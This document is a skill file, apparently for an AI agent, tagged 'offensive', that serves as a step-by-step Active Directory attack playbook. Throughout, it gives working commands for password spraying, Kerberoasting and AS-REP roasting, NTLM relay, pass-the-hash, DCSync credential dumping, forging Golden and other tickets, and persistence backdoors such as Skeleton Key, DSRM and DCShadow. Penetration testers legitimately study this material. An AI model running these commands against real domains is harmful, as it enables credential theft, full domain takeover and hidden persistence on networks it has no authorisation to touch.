---
name: active-directory-attack
description: Active Directory penetration testing — BloodHound enumeration, Kerberos attacks (Kerberoasting, AS-REP, Golden/Silver Ticket), NTLM relay, DCSync, lateral movement, domain dominance
metadata:
  type: offensive
  phase: exploitation
  tools: impacket, mimikatz, bloodhound, rubeus, crackmapexec, powerview, responder, kerbrute
  mitre: TA0008
---

# Active Directory Attacks

## When to Activate

- Attacking Windows domain environments
- Kerberos exploitation (Kerberoasting, AS-REP roasting, tickets)
- NTLM relay and lateral movement
- BloodHound enumeration and attack path discovery
- Domain privilege escalation and persistence
- DCSync and credential extraction

## Essential Tools

| Tool | Purpose |
|------|---------|
| BloodHound | AD attack path visualization |
| Impacket | Python AD attack suite |
| Mimikatz | Credential extraction |
| Rubeus | Kerberos attacks |
| CrackMapExec | Network exploitation |
| PowerView | AD enumeration |
| Responder | LLMNR/NBT-NS poisoning |
| Kerbrute | User enumeration & password spray |

## Core Workflow

### Step 1: Kerberos Clock Sync

Kerberos requires ±5 minutes clock synchronization:

```bash
# Detect clock skew
nmap -sT 10.10.10.10 -p445 --script smb2-time

# Fix clock on Linux
sudo date -s "14 APR 2026 18:25:16"

# Fix clock on Windows
net time /domain /set

# Fake clock without changing system time
faketime -f '+8h' <command>
```

### Step 2: AD Reconnaissance with BloodHound

```bash
# Start BloodHound
neo4j console
bloodhound --no-sandbox

# Collect data with SharpHound (Windows)
.\SharpHound.exe -c All
.\SharpHound.exe -c All --ldapusername user --ldappassword pass

# Python collector (Linux)
bloodhound-python -u 'user' -p 'password' -d domain.local -ns 10.10.10.10 -c all
```

### Step 3: PowerView Enumeration

```powershell
# Domain info
Get-NetDomain
Get-DomainSID
Get-NetDomainController

# User enumeration
Get-NetUser
Get-NetUser -SamAccountName targetuser
Get-UserProperty -Properties pwdlastset

# Group enumeration
Get-NetGroupMember -GroupName "Domain Admins"
Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty Member

# Find local admin access
Find-LocalAdminAccess -Verbose
Invoke-UserHunter
Invoke-UserHunter -Stealth
```

## Credential Attacks

### Password Spraying

```bash
# Kerbrute
./kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt Password123

# CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success
```

### Kerberoasting

```bash
# Find SPNs
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10

# Request TGS tickets
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile tgs.txt

# Crack tickets
hashcat -m 13100 tgs.txt rockyou.txt
# Or: john --wordlist=rockyou.txt --format=krb5tgs tgs.txt

# Rubeus (Windows)
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /outfile:hashes.txt /creduser:DOMAIN\user /credpassword:pass
```

### AS-REP Roasting (No Pre-Auth Required)

```bash
# Find users with DONT_REQ_PREAUTH
Get-DomainUser -PreauthNotRequired
# Or BloodHound: MATCH (u:User {dontreqpreauth:true}) RETURN u

# Request AS-REP
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -dc-ip 10.10.10.10 -no-pass

# Crack
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# Rubeus
Rubeus.exe asreproast /outfile:asrep.txt
```

## NTLM Relay Attacks

### Responder (LLMNR/NBT-NS Poisoning)

```bash
responder -I eth0 -wrf

# With WPAD poisoning
responder -I eth0 -A

# Analyze captured hashes
python3 /opt/Responder/tools/RunFinger.py -i 10.10.10.0/24
```

### NTLM Relay to SMB/LDAP

```bash
# Relay to SMB (requires SMB signing disabled)
ntlmrelayx.py -tf targets.txt -smb2support

# Relay to LDAP (create computer account + RBCD)
ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access

# Relay to AD CS (ESC8)
ntlmrelayx.py -t http://adcs.domain.local/certsrv/certfnsh.asp -smb2support
```

### SMB Signing Check

```bash
crackmapexec smb 10.10.10.0/24 --gen-relay-list relayable.txt
# Or check individually:
nmap -p445 --script smb-security-mode 10.10.10.10
```

## Lateral Movement

### Pass-the-Hash

```bash
# CrackMapExec
crackmapexec smb 10.10.10.10 -u user -H aad3b435b51404eeaad3b435b51404ee:NTLM_HASH -x "whoami"

# Impacket
psexec.py -hashes :NTLM_HASH domain.local/user@10.10.10.10
wmiexec.py -hashes :NTLM_HASH domain.local/user@10.10.10.10
smbexec.py -hashes :NTLM_HASH domain.local/user@10.10.10.10
```

### Pass-the-Ticket

```bash
# Export ticket (Rubeus)
Rubeus.exe dump /nowrap
# Or: Rubeus.exe triage

# Convert to Kirbi (if needed)
Rubeus.exe ticket /ticket:base64string

# Pass ticket
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py domain.local/user@10.10.10.10 -k -no-pass
```

### DCSync (Domain Replication)

```bash
# Requires: Replicating Directory Changes rights
impacket-secretsdump -just-dc domain.local/user:password@10.10.10.10

# Mimikatz
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator

# CrackMapExec
crackmapexec smb 10.10.10.10 -u user -p password --ntds drsuapi
```

## Kerberos Ticket Attacks

### Golden Ticket (KRBTGT Hash)

```bash
# Requires: KRBTGT NTLM hash + Domain SID
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt

# Rubeus
Rubeus.exe golden /rc4:HASH /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /ptt

# Impacket
ticketer.py -nthash HASH -domain-sid SID -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@DC_IP
```

### Silver Ticket (Service Account Hash)

```bash
# Requires: Service account NTLM hash + SPN
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:HASH /user:Administrator /ptt

# Access target service
dir \\server.domain.local\c$
```

### Diamond Ticket (Forged TGT)

```bash
# Forged ticket that looks legitimate (includes real PAC)
Rubeus.exe diamond /rc4:HASH /user:Administrator /domain:domain.local /sids:S-1-5-21-xxx-512 /ptt
```

### Sapphire Ticket

```bash
# Similar to Diamond but with more realistic PAC structure
Rubeus.exe sapphire /rc4:HASH /user:Administrator /domain:domain.local /sids:S-1-5-21-xxx-512 /ptt
```

## Persistence Mechanisms

### Skeleton Key

```bash
mimikatz # privilege::debug
mimikatz # misc::skeleton
# Now any user can authenticate with "mimikatz" as password
```

### AdminSDHolder

```powershell
# Modify AdminSDHolder ACL (persists across DA changes)
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All
```

### DSRM Backdoor

```powershell
# Dump DSRM hash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# Enable DSRM admin logon
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name DsrmAdminLogonBehavior -Value 2

# Pass DSRM hash
psexec.py -hashes :DSRM_HASH domain.local/Administrator@DC_IP
```

### DCShadow

```bash
# Requires: DA + Schema Admin rights
# Register rogue DC
lsadump::dcshadow /object:targetUser /attribute:userAccountControl /value=512

# Push changes
lsadump::dcshadow /push
```

## OPSEC Considerations

**Must Not:**
- Lock out accounts with excessive password spraying
- Modify production AD objects without approval
- Leave Golden Tickets without documentation

**Should:**
- Run BloodHound for attack path discovery
- Check SMB signing before relay attacks
- Verify patch levels for CVE exploitation

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Clock skew too great | Sync time with DC or use faketime |
| Kerberoasting returns empty | No service accounts with SPNs |
| DCSync access denied | Need Replicating Directory Changes rights |
| NTLM relay fails | Check SMB signing, try LDAP target |
| BloodHound empty | Verify collector ran with correct creds |
